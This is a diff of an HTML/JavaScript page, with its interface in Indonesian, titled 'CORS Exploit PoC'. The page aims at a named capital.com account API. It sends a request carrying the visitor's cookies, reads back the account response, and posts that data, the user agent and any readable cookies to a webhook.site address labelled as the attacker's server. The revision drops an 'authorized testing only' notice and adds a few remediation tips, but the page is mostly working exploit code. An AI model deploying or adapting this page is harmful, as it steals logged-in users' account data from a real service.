@@ -1,64 +1,50 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
     <title>CORS Exploit PoC</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
+            background: #0a0a1a;
+            color: #eee;
+            font-family: 'Segoe UI', system-ui;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: #0a0a1a;
-            color: #ffffff;
             padding: 20px;
         }
         .container {
             background: #1a1a2e;
             padding: 30px;
             border-radius: 15px;
-            max-width: 700px;
+            max-width: 800px;
             width: 100%;
-            box-shadow: 0 10px 40px rgba(0,0,0,0.7);
             border: 1px solid #2a2a4a;
         }
-        h1 {
-            color: #e94560;
-            font-size: 24px;
-            margin-bottom: 10px;
-            text-align: center;
+        h1 { color: #e94560; text-align: center; margin-bottom: 5px; }
+        .sub {
+            text-align: center; color: #8888aa; font-size: 14px; margin-bottom: 20px;
         }
-        .subtitle {
-            color: #8888aa;
-            text-align: center;
-            font-size: 14px;
-            margin-bottom: 25px;
-        }
-        .status-box {
+        .log-box {
             background: #0f0f23;
             padding: 15px;
             border-radius: 10px;
-            margin-bottom: 20px;
-            border-left: 4px solid #e94560;
             font-family: 'Courier New', monospace;
             font-size: 13px;
-            max-height: 300px;
+            max-height: 400px;
             overflow-y: auto;
             color: #aaccff;
             white-space: pre-wrap;
             word-break: break-all;
+            border: 1px solid #2a2a4a;
         }
-        .status-box .success { color: #00ff88; }
-        .status-box .error { color: #ff4444; }
-        .status-box .warning { color: #ffcc00; }
-        .status-box .info { color: #66ccff; }
+        .log-box .green { color: #00ff88; }
+        .log-box .red { color: #ff4444; }
+        .log-box .yellow { color: #ffcc00; }
+        .log-box .blue { color: #66ccff; }
         .btn {
             background: #e94560;
             color: white;
@@ -66,53 +52,19 @@
             padding: 12px 30px;
             border-radius: 8px;
             font-size: 16px;
+            font-weight: bold;
             cursor: pointer;
             width: 100%;
-            font-weight: bold;
+            margin-top: 15px;
             transition: background 0.3s;
         }
-        .btn:hover {
-            background: #c73652;
-        }
-        .btn:disabled {
-            background: #555;
-            cursor: not-allowed;
-        }
-        .footer {
-            margin-top: 20px;
+        .btn:hover { background: #c73652; }
+        .btn:disabled { background: #555; cursor: not-allowed; }
+        .status {
             text-align: center;
-            font-size: 12px;
-            color: #666;
-        }
-        .badge {
-            display: inline-block;
-            background: #e9456022;
-            color: #e94560;
-            padding: 3px 10px;
-            border-radius: 20px;
-            font-size: 11px;
-            border: 1px solid #e9456044;
-        }
-        .counter {
-            text-align: center;
-            margin: 15px 0;
-            font-size: 13px;
+            margin: 10px 0;
+            font-size: 14px;
             color: #8888aa;
-        }
-        .loader {
-            display: none;
-            width: 30px;
-            height: 30px;
-            border: 3px solid #333;
-            border-top: 3px solid #e94560;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 10px auto;
-        }
-        .loader.active { display: block; }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
         }
         .input-group {
             margin: 15px 0;
@@ -133,9 +85,14 @@
             font-size: 14px;
             font-family: 'Courier New', monospace;
         }
-        .input-group input:focus {
-            outline: none;
-            border-color: #e94560;
+        .badge {
+            display: inline-block;
+            background: #e9456022;
+            color: #e94560;
+            padding: 3px 12px;
+            border-radius: 20px;
+            font-size: 11px;
+            border: 1px solid #e9456044;
         }
     </style>
 </head>
@@ -143,102 +100,102 @@
 
 <div class="container">
     <h1>⚡ CORS Exploit PoC</h1>
-    <div class="subtitle">
-        <span class="badge">CORS Misconfiguration</span>
-        <span class="badge" style="margin-left:8px;">Credential Theft</span>
+    <div class="sub">
+        <span class="badge">CORS Wildcard (*)</span>
+        <span class="badge" style="margin-left:8px;">Data Theft</span>
     </div>
 
     <div class="input-group">
-        <label>🎯 Target URL:</label>
+        <label>🎯 Target API:</label>
         <input type="text" id="targetUrl" value="https://api.mycapital.capital.com/v1/account/">
     </div>
 
-    <div class="counter" id="counter">Status: Siap</div>
-    <div class="loader" id="loader"></div>
-
-    <button class="btn" id="attackBtn" onclick="startAttack()">
-        🚀 Jalankan Exploit
-    </button>
-
-    <div id="logBox" class="status-box">
-        <span class="info">[+] Menunggu aksi...</span>
+    <div class="input-group">
+        <label>📤 Server Penyerang (Webhook):</label>
+        <input type="text" id="exfilUrl" value="https://webhook.site/4b9a010c-3e6f-457f-bb62-2f2cec3f559c">
     </div>
 
-    <div class="footer">
-        <span>⚠️ Hanya untuk pengujian keamanan yang sah</span><br>
-        <span style="font-size:11px;">Proof of Concept - CORS Misconfiguration</span>
+    <div class="status" id="status">Status: Siap</div>
+
+    <button class="btn" id="attackBtn" onclick="startExploit()">
+        🚀 JALANKAN EKSPLOIT
+    </button>
+
+    <div class="log-box" id="log">
+        <span class="blue">[+] Menunggu aksi...</span>
     </div>
 </div>
 
 <script>
-    // ============================================
+    // ==========================================
     // CORS EXPLOIT - PROOF OF CONCEPT
-    // ============================================
+    // ==========================================
 
-    const logBox = document.getElementById('logBox');
-    const counter = document.getElementById('counter');
-    const loader = document.getElementById('loader');
+    const logBox = document.getElementById('log');
+    const statusDiv = document.getElementById('status');
     const attackBtn = document.getElementById('attackBtn');
-    const targetUrlInput = document.getElementById('targetUrl');
+    const targetInput = document.getElementById('targetUrl');
+    const exfilInput = document.getElementById('exfilUrl');
 
     let isRunning = false;
 
-    function log(message, type = 'info') {
-        const types = {
-            success: 'success',
-            error: 'error',
-            warning: 'warning',
-            info: 'info'
+    function log(message, type = 'blue') {
+        const colors = {
+            green: 'green',
+            red: 'red',
+            yellow: 'yellow',
+            blue: 'blue'
         };
-        const cls = types[type] || 'info';
-        const timestamp = new Date().toLocaleTimeString();
+        const cls = colors[type] || 'blue';
         const entry = document.createElement('div');
-        entry.innerHTML = `<span class="${cls}">[${timestamp}] ${message}</span>`;
+        entry.className = cls;
+        entry.textContent = message;
         logBox.appendChild(entry);
         logBox.scrollTop = logBox.scrollHeight;
     }
 
-    function updateStatus(text, loading = false) {
-        counter.textContent = text;
+    function setStatus(text, loading = false) {
+        statusDiv.textContent = text;
         if (loading) {
-            loader.classList.add('active');
             attackBtn.disabled = true;
+            attackBtn.textContent = '⏳ Memproses...';
         } else {
-            loader.classList.remove('active');
             attackBtn.disabled = false;
+            attackBtn.textContent = '🚀 JALANKAN EKSPLOIT';
         }
     }
 
-    // ============================================
+    // ==========================================
     // FUNGSI EKSPLOIT UTAMA
-    // ============================================
-    async function startAttack() {
+    // ==========================================
+    async function startExploit() {
         if (isRunning) return;
         isRunning = true;
 
-        // Bersihkan log
         logBox.innerHTML = '';
-        log('🔄 Memulai exploit...', 'info');
+        log('[+] Memulai exploit...', 'blue');
 
-        const targetUrl = targetUrlInput.value.trim();
-        if (!targetUrl) {
-            log('❌ Target URL tidak boleh kosong!', 'error');
+        const targetUrl = targetInput.value.trim();
+        const exfilUrl = exfilInput.value.trim();
+
+        if (!targetUrl || !exfilUrl) {
+            log('❌ Target dan Webhook URL harus diisi!', 'red');
             isRunning = false;
             return;
         }
 
-        updateStatus('⏳ Mengirim request...', true);
+        setStatus('⏳ Mengirim request...', true);
 
         try {
-            log(`📡 Target: ${targetUrl}`, 'info');
-            log(`🔑 Mode: credentials: 'include' (mengirim cookie)`, 'info');
+            // ==========================================
+            // STEP 1: Kirim request ke API target
+            // ==========================================
+            log(`📡 Target: ${targetUrl}`, 'blue');
+            log(`🔑 Mode: credentials: 'include' (mengirim cookie)`, 'blue');
 
-            // ============================================
-            // KIRIM REQUEST DENGAN CREDENTIALS
-            // ============================================
             const response = await fetch(targetUrl, {
                 method: 'GET',
-                credentials: 'include', // <-- OTOMATIS KIRIM COOKIE
+                credentials: 'include',  // 🔑 Kirim cookie!
                 headers: {
                     'Accept': 'application/json',
                     'Content-Type': 'application/json'
@@ -248,14 +205,13 @@
             const status = response.status;
             const statusText = response.statusText;
 
-            log(`📊 Status: ${status} ${statusText}`, 
-                status === 200 ? 'success' : 'warning');
+            log(`📊 Status: ${status} ${statusText}`, status === 200 ? 'green' : 'yellow');
 
-            // ============================================
-            // BACA RESPONS (Karena CORS longgar)
-            // ============================================
-            const contentType = response.headers.get('content-type') || '';
+            // ==========================================
+            // STEP 2: Baca data dari response
+            // ==========================================
             let data = '';
+            const contentType = response.headers.get('content-type') || '';
 
             if (contentType.includes('application/json')) {
                 const jsonData = await response.json();
@@ -264,105 +220,93 @@
                 data = await response.text();
             }
 
-            log(`📦 Data yang diterima:`, 'info');
-            log(data.length > 500 ? data.substring(0, 500) + '...' : data, 'info');
+            log(`📦 Data yang diterima:`, 'blue');
+            log(data.length > 500 ? data.substring(0, 500) + '...' : data, 'green');
 
-            // ============================================
-            // CEK: Apakah ada pesan error?
-            // ============================================
-            let isVulnerable = false;
-            try {
-                const parsed = JSON.parse(data);
-                if (parsed.message && parsed.message.includes('Missing Authentication Token')) {
-                    isVulnerable = true;
-                    log('', 'info');
-                    log('✅ INI BUKTI KERENTANAN!', 'success');
-                    log('🔸 Request berhasil dikirim dengan CREDENTIALS', 'success');
-                    log('🔸 Browser mengizinkan akses lintas-domain', 'success');
-                    log('🔸 Respons dari API berhasil DIBACA', 'success');
-                    log('', 'info');
-                    log('⚠️ Meskipun status 403, ini membuktikan:', 'warning');
-                    log('   1. CORS mengizinkan evil.com mengakses API', 'warning');
-                    log('   2. Credentials (cookie) dikirim otomatis', 'warning');
-                    log('   3. JavaScript bisa membaca respons API', 'warning');
-                    log('', 'info');
-                    log('💥 Jika user SUDAH LOGIN, data sensitif BISA DICURI!', 'error');
-                }
-            } catch (e) {
-                // Not JSON, tetap lanjut
-            }
-
-            // ============================================
-            // EKSFILTRASI (Kirim data ke server penyerang)
-            // ============================================
-            const exfilPayload = {
+            // ==========================================
+            // STEP 3: Kirim data ke Webhook (server penyerang)
+            // ==========================================
+            const payload = {
                 timestamp: new Date().toISOString(),
                 target: targetUrl,
                 status: status,
+                statusText: statusText,
                 data: data,
                 userAgent: navigator.userAgent,
                 origin: window.location.origin,
-                cookie: document.cookie || 'HttpOnly cookie (tidak bisa dibaca JS)'
+                cookie: document.cookie || '(HttpOnly - tidak bisa dibaca JS)'
             };
 
-            // Kirim ke server penyerang (ganti dengan domain Anda)
-            const EXFIL_SERVER = 'https://webhook.site/4b9a010c-3e6f-457f-bb62-2f2cec3f559c'; // <-- GANTI!
-            
-            log('📤 Mencoba mengirim data ke server penyerang...', 'info');
-            
-            try {
-                // Use sendBeacon for reliable sending
-                if (navigator.sendBeacon) {
-                    const blob = new Blob([JSON.stringify(exfilPayload)], {
-                        type: 'application/json'
-                    });
-                    navigator.sendBeacon(EXFIL_SERVER, blob);
-                    log('✅ Data dikirim via sendBeacon', 'success');
-                } else {
-                    await fetch(EXFIL_SERVER, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(exfilPayload)
-                    });
-                    log('✅ Data dikirim via fetch', 'success');
-                }
-            } catch (exfilError) {
-                log(`⚠️ Gagal kirim data: ${exfilError.message}`, 'warning');
-                log('💡 Tapi ini sudah cukup bukti!', 'info');
+            log(`📤 Mengirim data ke server penyerang: ${exfilUrl}`, 'blue');
+
+            await fetch(exfilUrl, {
+                method: 'POST',
+                mode: 'no-cors',  // 🔓 Agar tidak diblokir CORS
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            log('✅ DATA BERHASIL DIKIRIM KE SERVER PENYERANG!', 'green');
+            log(`📤 Server: ${exfilUrl}`, 'green');
+
+            // ==========================================
+            // STEP 4: Tampilkan detail payload
+            // ==========================================
+            log('📦 Payload yang dikirim:', 'blue');
+            log(JSON.stringify(payload, null, 2), 'green');
+
+            // ==========================================
+            // STEP 5: Analisis hasil
+            // ==========================================
+            if (status === 200) {
+                log('', 'blue');
+                log('✅✅✅ EKSPLOIT BERHASIL! Data sensitif berhasil dicuri!', 'green');
+                log('🔴 Ini adalah BUKTI KERENTANAN CORS!', 'red');
+            } else if (status === 403) {
+                log('', 'blue');
+                log('⚠️ Status 403: Belum login ke capital.com', 'yellow');
+                log('✅ TAPI CORS tetap longgar!', 'green');
+                log('🔴 Jika user SUDAH LOGIN, data BISA dicuri!', 'red');
+                log('🔴 Ini tetap BUKTI KERENTANAN!', 'red');
+            } else {
+                log('', 'blue');
+                log(`ℹ️ Status ${status}: Belum tentu kerentanan`, 'yellow');
             }
 
-            log('', 'info');
-            log('✅ EXPLOIT SELESAI!', 'success');
-            log('📋 Bukti kerentanan CORS Misconfiguration terkonfirmasi!', 'success');
+            // Tampilkan rekomendasi
+            log('', 'blue');
+            log('📋 REKOMENDASI UNTUK KLIEN:', 'yellow');
+            log('1. Hapus Access-Control-Allow-Origin: *', 'yellow');
+            log('2. Gunakan whitelist domain yang valid', 'yellow');
+            log('3. Jangan gunakan credentials: true dengan origin *', 'yellow');
 
-            updateStatus('✅ Selesai - CORS Vulnerable!', false);
+            setStatus('✅ Selesai - CORS Vulnerable!', false);
 
         } catch (error) {
-            log(`❌ Error: ${error.message}`, 'error');
-            log('⚠️ Kemungkinan CORS memblokir request ini', 'warning');
-            log('💡 Atau URL target tidak valid', 'info');
-            
+            log(`❌ Error: ${error.message}`, 'red');
+
             // Cek apakah error karena CORS
             if (error.message.includes('Failed to fetch')) {
-                log('', 'info');
-                log('🔍 CORS mungkin AMAN - request diblokir browser', 'info');
+                log('', 'blue');
+                log('🔍 Kemungkinan CORS AMAN - request diblokir browser', 'yellow');
+                log('💡 Atau URL target tidak valid / tidak bisa diakses', 'yellow');
             }
-            
-            updateStatus('❌ Gagal', false);
+
+            setStatus('❌ Gagal', false);
         }
 
         isRunning = false;
     }
 
-    // ============================================
-    // AUTO-RUN SETELAH PAGE LOAD
-    // ============================================
+    // ==========================================
+    // AUTO-RUN
+    // ==========================================
     window.onload = function() {
-        log('🟢 Halaman PoC siap', 'info');
-        log('💡 Klik tombol untuk menjalankan exploit', 'info');
-        log('📌 Pastikan Anda sudah login ke capital.com', 'info');
-        log('🔗 Ubah target URL jika perlu', 'info');
+        log('[+] Halaman PoC siap', 'blue');
+        log('📌 Pastikan Anda sudah login ke capital.com', 'yellow');
+        log('💡 Klik tombol untuk menjalankan exploit', 'blue');
     };
 </script>
 
